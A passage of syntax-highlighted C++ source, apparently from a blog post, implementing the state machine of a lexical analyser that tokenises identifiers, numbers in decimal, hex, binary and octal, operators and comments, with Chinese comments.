class="comment">// 状态转移-&gt;11 </span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;!&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">12</span>);        <span class="comment">// 状态转移-&gt;12 </span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;+&#x27;</span> || wd == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">13</span>);         <span class="comment">// 状态转移-&gt;13 加减号(正负号)</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">14</span>);        <span class="comment">// 状态转移-&gt;14 考虑.5 == 0.5 ,此时.后必须有数字</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isDelimiter</span>())&#123;        <span class="comment">// 单字分界符直接给出结果</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">3</span>;</span><br><span class="line">                            <span class="built_in">output</span>();               <span class="comment">// 存储词元、输出、初始化</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> i = <span class="built_in">passError</span>(i);      <span class="comment">// 检测到非法字符如&quot;^#$&quot;等</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">1</span>:&#123;    <span class="comment">// 字母开头,全字母情况 可终止 -&gt; 标识符或关键字</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>()) <span class="built_in">newStatus</span>(<span class="number">1</span>);    <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>() || wd == <span class="string">&#x27;_&#x27;</span>)&#123;     <span class="comment">// 状态转移-&gt;17</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">17</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 处理缓存内容</span></span><br><span class="line">                            cag = <span class="built_in">isKeywords</span>();</span><br><span class="line">                            <span class="keyword">if</span>(cag) type = <span class="number">0</span>;   <span class="comment">// 是关键字</span></span><br><span class="line">                            <span class="keyword">else</span> type = <span class="number">4</span>;    <span class="comment">// 标识符</span></span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">2</span>:&#123;        <span class="comment">// 非零数字开头，可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd==<span class="string">&#x27;.&#x27;</span>)&#123;    <span class="comment">// 转移状态-&gt;18 十进制实数, 此时.后可以无内容</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);   </span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;    <span class="comment">// 转移状态-&gt;19 科学计数法E</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;      <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">2</span>);   </span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;\&#x27;&#x27;</span> || wd == <span class="string">&#x27;&quot;&#x27;</span>)&#123;     <span class="comment">// 十进制数后跟字母或引号铁铁出错</span></span><br><span class="line">                            i = <span class="built_in">passError</span>(i);   <span class="comment">// 出错处理</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 被视为整常数，重置缓存</span></span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">3</span>:&#123;    <span class="comment">// 0开头数字，可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;X&#x27;</span> || wd == <span class="string">&#x27;x&#x27;</span>)&#123;     <span class="comment">// 状态转移-&gt;20 十六进制X</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">20</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;b&#x27;</span> || wd == <span class="string">&#x27;B&#x27;</span>)&#123;    <span class="comment">// 状态转移-&gt;21 二进制数b</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">21</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">8</span>))&#123;   <span class="comment">// 状态转移-&gt;22 八进制数</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">22</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;\&#x27;&#x27;</span> || wd == <span class="string">&#x27;&quot;&#x27;</span>)&#123;     <span class="comment">// 十进制数后跟字母或引号铁铁出错</span></span><br><span class="line">                            i = <span class="built_in">passError</span>(i);   <span class="comment">// 出错处理</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 被视为整常数0</span></span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">4</span>:&#123;    <span class="comment">// 检查 &amp; 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;&amp;&#x27;</span>)&#123;  <span class="comment">// 与运算符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">5</span>:&#123;    <span class="comment">// 检查 | 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;|&#x27;</span>)&#123;  <span class="comment">// 或运算符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">6</span>:&#123;    <span class="comment">// 检查 : 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// 赋值号:=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span>&#123;    <span class="comment">// 冒号:</span></span><br><span class="line">                            type = <span class="number">3</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">7</span>:&#123;    <span class="comment">// 检查 &gt; 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// &gt;=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// &gt;</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">8</span>:&#123;    <span class="comment">// 检查 &lt; 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// &lt;=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&gt;&#x27;</span>)&#123;   <span class="comment">// &lt;&gt;</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;    <span class="comment">// &lt;</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">9</span>:&#123;    <span class="comment">// 检查 / 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;23 单行注释符//</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">23</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>)&#123; <span class="comment">// 状态转移-&gt;24 多行注释符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">24</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 除号/</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">10</span>:&#123;   <span class="comment">// 检查 *</span></span><br><span class="line">                        type = <span class="number">1</span>;</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        i -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">11</span>:&#123;   <span class="comment">// 检查 =</span></span><br><span class="line">                        type = <span class="number">1</span>;</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        i -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">12</span>:&#123;   <span class="comment">// 检查 !</span></span><br><span class="line">                        type = <span class="number">1</span>;</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        i -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">13</span>:&#123;   <span class="comment">// +-号 不完美的DFA 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(cag == <span class="number">41</span> || cag == <span class="number">42</span> || cag == <span class="number">45</span> || cag ==<span class="number">56</span> )&#123;     <span class="comment">// 前面出现操作数则为加减号, &#x27;(&#x27;被视为有效界符, &#x27;)&#x27; 则被视为操作数</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>)&#123;         <span class="comment">// 状态转移-&gt;14 实数</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">14</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">0</span>))&#123;        <span class="comment">// 状态转移-&gt;2 非0数字</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">2</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;0&#x27;</span>)&#123;         <span class="comment">// 状态转移-&gt;3 数字0</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">3</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;   <span class="comment">// 加减号</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">14</span>:&#123;   <span class="comment">// . 实数 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123; <span class="comment">// 状态转移-&gt;18 正常实数</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">3</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">17</span>:&#123;   <span class="comment">// 标识符 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>() || <span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;_&#x27;</span>)&#123;  <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">17</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 获取标识符</span></span><br><span class="line">                            type = <span class="number">4</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">18</span>:&#123;   <span class="comment">// 真 实数 后可不跟数字 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123; <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;19 科学计数法  允许有: 3.e7 的写法</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 截取实数</span></span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">42</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; </span><br><span class="line">                    <span class="keyword">case</span> <span class="number">19</span>:&#123;   <span class="comment">// 科学计数法e 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;+&#x27;</span> || wd == <span class="string">&#x27;-&#x27;</span>)&#123;     <span class="comment">// 状态转移-&gt;25 科学计数法+-</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">25</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;      <span class="comment">// 状态转移-&gt;26 十进制整数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">26</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 出错啦</span></span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">20</span>:&#123;   <span class="comment">// 十六进制x 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">16</span>))&#123;   <span class="comment">// 状态转移-&gt;27 十六进制整数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">27</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">21</span>:&#123;   <span class="comment">// 二进制数b 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">2</span>))&#123;    <span class="comment">// 状态转移-&gt;28 二进制数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">28</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">22</span>:&#123;   <span class="comment">// 八进制数中态 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">8</span>))&#123;    <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">22</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;19 科学计数法e</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>)&#123;   <span class="comment">// 状态转移-&gt;18 当做十进制数处理的八进制小数(C++中自适应)</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">23</span>:&#123;   <span class="comment">// 单行注释符// 条件终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;\n&#x27;</span>)&#123;   <span class="comment">// 截取单行注释串</span></span><br><span class="line">                            type = <span class="number">5</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">23</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">24</span>:&#123;   <span class="comment">// 多行注释符/* 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;29 检测退出记号*/</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">29</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">24</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">25</span>:&#123;   <span class="comment">// 科学计数法+- 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;     <span class="comment">// 状态转移-&gt;26 十进制整数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">26</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">26</span>:&#123;   <span class="comment">// 十进制整数后终态 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;     <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">26</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">42</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">27</span>:&#123;   <span class="comment">// 十六进制整数后终态 十六进制不接受小数点</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">16</span>))&#123;   <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">27</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;19</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">28</span>:&#123;   <span class="comment">// 二进制数后终态</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">2</span>))&#123;</span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">28</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">29</span>:&#123;   <span class="comment">// 检测退出记号 */</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                            type = <span class="number">5</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; </span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>)&#123;     <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">29</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;    <span class="comment">// 状态转移-&gt;24</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">24</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(needOF &amp;&amp; !silence)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;==&gt; The output has been saved to the file: %s&quot;</span>, oFP.<span class="built_in">c_str</span>());   <span class="comment">// 保存文件</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">blankContinue</span><span class="params">()</span></span>&#123;    <span class="comment">// 跳过空白字符，考虑换行对正负加减的影响</span></span><br><span class="line">            <span class="keyword">if</span>(wd == <span class="string">&#x27;\n&#x27;</span>) cag = <span class="number">51</span>;     <span class="comment">// 对于大部分词元而言换行等价于分号 </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">passError</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;   <span class="comment">// 跳过错误部分，不考虑错误部分引号的性质</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=n; i&lt;srcLen; i++)&#123;</span><br><span class="line">                wd = src[i];</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isDelimiter</span>() || <span class="built_in">isBlank</span>() || wd == <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                    <span class="built_in">outError</span>();</span><br><span class="line">                    <span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(wd == <span class="string">&#x27;:&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(src[i+<span class="number">1</span>]!=<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">                        <span class="built_in">outError</span>();</span><br><span class="line">                        <span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(src[i+<span class="number">1</span>]==<span class="string">&#x27;/&#x27;</span> || src[i+<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                        <span class="built_in">outError</span>();</span><br><span class="line">                        <span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">newStatus</span>(<span class="number">-1</span>);  <span class="comment">// 避免分界符被放入错误输出中</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> srcLen<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">outError</span><span class="params">()</span></span>&#123;     <span class="comment">// 错误报告</span></span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;Error with: %s\n&quot;</span>, words.<span class="built_in">c_str</span>());</span><br><span class="line">            <span class="built_in">newStatus</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">newStatus</span><span class="params">(<span class="type">int</span> _s)</span></span>&#123;  <span class="comment">// 更新状态</span></span><br><span class="line">            <span class="keyword">switch</span>(_s)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 为0则初始化状态</span></span><br><span class="line">                    status = <span class="number">0</span>;    <span class="comment">// 原始状态</span></span><br><span class="line">                    len = <span 